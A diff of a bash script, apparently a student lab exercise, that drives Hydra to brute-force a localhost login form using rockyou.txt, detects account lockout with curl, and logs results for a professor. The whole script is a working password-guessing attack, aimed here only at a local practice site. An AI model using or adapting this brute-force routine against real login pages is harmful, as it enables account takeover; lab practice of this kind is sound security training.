@@ -1,5 +1,9 @@
 #!/bin/bash
 
+# --- LOGGING SETUP ---
+LOGFILE="bruteforce_report.log"
+echo "--- NEW SESSION: $(date) ---" >> $LOGFILE
+
 # --- MENU SELECTION ---
 echo "------------------------------------------------"
 echo "Select the target environment:"
@@ -9,78 +13,61 @@ echo "------------------------------------------------"
 read -p "Enter your choice [1 or 2]: " choice
 
 if [[ "$choice" == "1" ]]; then
-    echo "[*] Configuring for SIMPLE website..."
-    # Localhost URL for the curl check
+    MODE="SIMPLE"
     URL="http://localhost/HydraBruteLab/simple/login.php"
     WORDLIST="rockyou.txt"
-    # Path specifically for the Hydra command syntax
     URL_PATH="/HydraBruteLab/simple/login.php"
-    
 elif [[ "$choice" == "2" ]]; then
-    echo "[*] Configuring for ADVANCED website..."
-    # Localhost URL for the curl check
+    MODE="ADVANCED"
     URL="http://localhost/HydraBruteLab/advanced/login.php"
     WORDLIST="pass.txt"
-    # Path specifically for the Hydra command syntax
     URL_PATH="/HydraBruteLab/advanced/login.php"
-    
 else
     echo "[!] Invalid selection. Exiting."
     exit 1
 fi
 
+echo "[*] Target Mode: $MODE" | tee -a $LOGFILE
+
 # --- CONFIGURATION ---
 USER="admin@admin.admin"
-# The message that indicates the account is locked
 LOCK_MSG="Account temporary locked"
-# The standard failure message (used to define the Hydra command)
 FAIL_MSG="Wrong password"
 
-# Check if wordlist exists
 if [ ! -f "$WORDLIST" ]; then
-    echo "[!] Error: Wordlist '$WORDLIST' not found!"
+    echo "[!] Error: Wordlist '$WORDLIST' not found!" | tee -a $LOGFILE
     exit 1
 fi
 
-echo "------------------------------------------------"
-echo "[*] Starting Attack on: localhost$URL_PATH"
-echo "------------------------------------------------"
+echo "[*] Starting Attack on: localhost$URL_PATH" | tee -a $LOGFILE
 
-# --- RUN HYDRA (No Chunking) ---
-# We run Hydra once. We capture the output to variable $OUTPUT so we can analyze it.
-# Note: If the account locks during this run, Hydra might report a "False Positive" 
-# (saying it found a password) because the "Wrong password" message disappeared.
-# That is why the Lock Check below is crucial.
-
+# --- RUN HYDRA ---
+# Capture output
 OUTPUT=$(hydra -l $USER -P $WORDLIST -t 1 -o /dev/null localhost http-form-post "$URL_PATH:email=^USER^&password=^PASS^&submit=Submit:F=$FAIL_MSG" 2>&1)
-echo "$OUTPUT"
-# --- CHECK FOR LOCKOUT ---
-# As requested: Check strictly if account is locked. If so, STOP.
-# We probe the server manually with curl to see the current status.
 
+# Log the raw Hydra output for the professor
+echo "--- Raw Hydra Output ---" >> $LOGFILE
+echo "$OUTPUT" >> $LOGFILE
+echo "------------------------" >> $LOGFILE
+
+# --- CHECK FOR LOCKOUT ---
 TEST_RESP=$(curl -s -d "email=$USER&password=CheckLockStatus&submit=Submit" $URL)
 
 if [[ "$TEST_RESP" == *"$LOCK_MSG"* ]]; then
-    echo ""
-    echo "#############################################"
-    echo "[!] ALERT: ACCOUNT LOCKED OUT!"
-    echo "#############################################"
-    echo "[*] The server is returning: '$LOCK_MSG'"
-    echo "[*] Stopping script immediately as requested."
+    RESULT="[!] ALERT: ACCOUNT LOCKED OUT"
+    echo "$RESULT" | tee -a $LOGFILE
+    echo "Server Response: $LOCK_MSG" >> $LOGFILE
     exit 1
 fi
 
 # --- CHECK FOR SUCCESS ---
-# If we are NOT locked out, we check if Hydra actually found the password.
-
 if echo "$OUTPUT" | grep -q "host: localhost"; then
-     echo ""
-     echo "#############################################"
-     echo "[+] SUCCESS FOUND!"
-     # Extract the line containing the password from Hydra output
-     echo "$OUTPUT" | grep "login:" 
-     echo "#############################################"
-     exit 0
+     PASS_FOUND=$(echo "$OUTPUT" | grep "login:")
+     RESULT="[+] SUCCESS: $PASS_FOUND"
+     echo "$RESULT" | tee -a $LOGFILE
 else
-     echo "[-] Attack finished. No password found (and not locked)."
+     RESULT="[-] FINISHED: No password found."
+     echo "$RESULT" | tee -a $LOGFILE
 fi
+
+echo "--- SESSION ENDED ---" >> $LOGFILE
